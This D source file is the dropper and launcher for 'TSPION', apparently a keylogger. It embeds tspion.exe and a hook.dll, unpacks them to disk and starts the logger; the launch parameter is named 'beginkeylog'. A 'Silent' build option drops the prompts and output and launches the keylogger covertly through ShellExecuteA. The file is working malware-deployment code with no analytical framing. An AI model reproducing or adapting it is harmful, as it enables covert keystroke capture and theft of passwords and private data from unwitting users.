/* Copyright 2010 Jimmy Cao

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License. */

import std.c.windows.windows;
import std.stdio;
import std.string;

enum int BLOCKSIZE = 1024;

extern (Windows)
{
    HINSTANCE ShellExecuteA(HWND, LPCSTR, LPCSTR, LPCSTR, LPCSTR, INT);
}

void main() {
    version(Silent)
    {
        pragma(msg, "Silent Mode is On");
        unpack();
        launch(true);
        return;
    }
    
	HANDLE hc = GetStdHandle(STD_OUTPUT_HANDLE);
	SetConsoleTextAttribute(hc, 0x0a);
	
	writeln("Welcome to the TSPION launch system.\n");
	writeln("Copyright 2010 - Jimmy Cao.");
	writeln("TSPION comes with ABSOLUTELY NO WARRANTY.");
	write("Would you like to launch TSPION after unpacking (Y/n)?  ");
	
	auto yesorno = readln();
	bool autolaunch = false;
	if(yesorno.strip.toupper == "Y")
		autolaunch = true;
	writeln("\n");
	
	SetConsoleTextAttribute(hc, 0x0d);
	unpack();
	launch(autolaunch);
	SetConsoleTextAttribute(hc, 0x07);
}

void unpack() {
	immutable(char[]) exedata = import("tspion.exe");
	immutable(char[]) dlldata = import("hook.dll");
	
	write_wp(exedata, "tspion.exe");
	write_wp(dlldata, "hook.dll");
}

void write_wp(immutable(char[]) data, string fname) {
	uint lendata = data.length;
	int progress;
	write("["~" ".repeat(50)~"]"~"   0.00%");
    File file = File(fname, "w");
    scope(exit) file.close();
    int i,a = 0;
    int times = lendata/BLOCKSIZE;
	for(;lendata-i>BLOCKSIZE; i += BLOCKSIZE)
    {
        a++;
		auto cprog = cast(int)((cast(float)i/lendata)*50);
		if(progress < cprog) {
			write("\b".repeat(60));
			write("["~"*".repeat(cprog)~" ".repeat(50-cprog)~"]");
			writef("%7.2f", 100.0*i/lendata);
			write("%");
			version(Normal) stdout.flush();
			progress = cprog;
		}
		file.rawWrite(data[i..i+BLOCKSIZE]);
	}
    file.rawWrite(data[i..$]);
    version(Normal)
    {
        write("\b".repeat(60));
        write(" ".repeat(60));
        write("\b".repeat(60));
        writefln("Unpacked %s.", fname);
    }
    file.close();
}

void launch(bool beginkeylog) {
	char[] modfname;
	modfname.length = 256;
	auto ns = GetModuleFileNameA(cast(HMODULE)null, &modfname[0], 256);
	string modname = std.conv.to!string(modfname[0 .. ns]).strip;
	
    version(Normal)
    {
        if(beginkeylog)
            std.process.system(`start tspion.exe sd "`~modname~`"`);
        else
            std.process.system(`start tspion.exe sdonly "`~modname~`"`);
    }
    
    version(Silent)
    {
        ShellExecuteA(null, "open", "tspion.exe", toStringz("sd \""~modname~"\""), null, SW_SHOWDEFAULT);
    }
}